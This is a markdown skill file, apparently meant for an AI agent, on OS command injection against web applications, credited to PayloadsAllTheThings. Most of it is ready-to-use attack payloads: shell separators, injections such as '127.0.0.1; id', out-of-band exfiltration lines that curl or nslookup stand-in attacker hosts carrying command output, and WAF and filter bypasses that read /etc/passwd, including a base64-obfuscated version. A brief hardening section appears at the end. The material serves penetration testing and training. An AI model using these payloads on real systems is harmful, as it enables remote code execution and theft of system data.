---
name: command-injection
description: Inject OS commands through unsanitized input passed to shell/exec; covers bash, cmd, PowerShell payloads, blind/OOB techniques, and filter bypasses
domain: cybersecurity
subdomain: web-application-security
tags: [command-injection, rce, shell-injection, oob]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Command Injection
---

# OS Command Injection

## Overview
User input concatenated into a shell invocation (`system`, `exec`, `popen`, `os.system`, `Runtime.exec`, `child_process.exec`, `Process.Start` with `/bin/sh -c`) allows attacker to append/replace commands.

## When to Use
Suspect any endpoint that calls system tools — ping, nslookup, image conversion (ImageMagick, ffmpeg), zip/unzip, git, file utilities, log/backup features.

## Separators & Operators
```
;   |   &   &&   ||   `cmd`   $(cmd)   %0a (LF)   %0d (CR)
| cmd
&& cmd
$(cmd)
`cmd`
{cmd,arg}            # brace
newline injection: payload\ncmd
Windows: & | && ||  ^  caret escape   %COMSPEC%
```

## Classic Payloads
```
127.0.0.1; id
127.0.0.1 | whoami
$(curl http://OOB/$(id|base64))
;curl http://OOB/`whoami`
|| ping -c 4 OOB
```

## Blind / OOB
- DNS exfil: `nslookup `whoami`.attacker.tld`
- HTTP exfil: `curl http://oob/?d=$(id|base64 -w0)`
- Time-based: `sleep 10`, `ping -c 10 127.0.0.1`

## Filter Bypass
- Quotes / escapes: `w""hoami`, `w\hoami`, `''id''`.
- Variable expansion: `${IFS}` instead of space, `${PATH:0:1}` = `/`.
- No-space: `{cat,/etc/passwd}`, `cat</etc/passwd`.
- Base64 wrap: `bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash`.
- Wildcards: `/???/??t /???/p?sswd`.
- Backslash-newline, comments `#`.
- WAF bypass for `id`: `i\d`, `i$@d`, `i"d`, `i''d`.

## Tools
- **commix** (automated).
- **InteractSH / Burp Collaborator** for blind OOB.
- **Ground Control** / DNS-rebind for egress-restricted hosts.

## Hardening
- Don't shell out — use library APIs.
- If you must, pass args as array, never concatenate user input.
- Strict allowlist (regex) on inputs; reject metacharacters.
- Run with least privilege, AppArmor/seccomp.

## References
- `payloadsallthethings/Command Injection/README.md`
- PayloadBox bash-injection wordlists.
